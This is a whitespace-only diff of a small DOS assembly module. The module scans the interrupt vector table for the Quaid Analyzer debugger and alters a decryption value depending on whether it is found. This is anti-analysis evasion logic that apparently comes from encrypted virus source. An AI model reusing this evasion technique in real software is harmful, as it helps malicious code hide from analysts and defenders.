@@ -27,41 +27,41 @@
 ;********** Quaid Analyzer detection
 ;           Alter decryption depending on detection
 
-main:				xor			ax,ax
-				mov			ds,ax
-				mov			si,ax
-				mov			cx,00ffh
-qa_0:				lodsw
-				mov			di,ax
-				lodsw
-				mov			es,ax
-				mov			ax,es:[di]
-				cmp			ax,509ch
-				jne			qa_1
-				mov			al,es:[di+2]
-				cmp			al,0b0h
-				jne			qa_1
-				mov			ax,es:[di+4]
-				cmp			ax,0eebh
-				jne			qa_1
-				mov			ax,cs
-				mov			bx,ax
-				mov			ds,bx
-				mov			ax,ds:[0004h]
-				add			ax,bx
-				mov			ds:[0004h],ax
-				ret
-qa_1:				loop			qa_0
-				mov			ax,cs
-				mov			bx,ax
-				mov			ds,bx
-				mov			ax,ds:[0004h]
-				sub			ax,0100h
-				mov			ds:[0004h],ax
-				ret
+main:                   xor               ax,ax
+                        mov               ds,ax
+                        mov               si,ax
+                        mov               cx,00ffh
+qa_0:                   lodsw
+                        mov               di,ax
+                        lodsw
+                        mov               es,ax
+                        mov               ax,es:[di]
+                        cmp               ax,509ch
+                        jne               qa_1
+                        mov               al,es:[di+2]
+                        cmp               al,0b0h
+                        jne               qa_1
+                        mov               ax,es:[di+4]
+                        cmp               ax,0eebh
+                        jne               qa_1
+                        mov               ax,cs
+                        mov               bx,ax
+                        mov               ds,bx
+                        mov               ax,ds:[0004h]
+                        add               ax,bx
+                        mov               ds:[0004h],ax
+                        ret
+qa_1:                   loop              qa_0
+                        mov               ax,cs
+                        mov               bx,ax
+                        mov               ds,bx
+                        mov               ax,ds:[0004h]
+                        sub               ax,0100h
+                        mov               ds:[0004h],ax
+                        ret
 
 ;********** Padding the module to 64 bytes
 
-				db			7 dup (13)
+                        db                7 dup (13)
 
 END
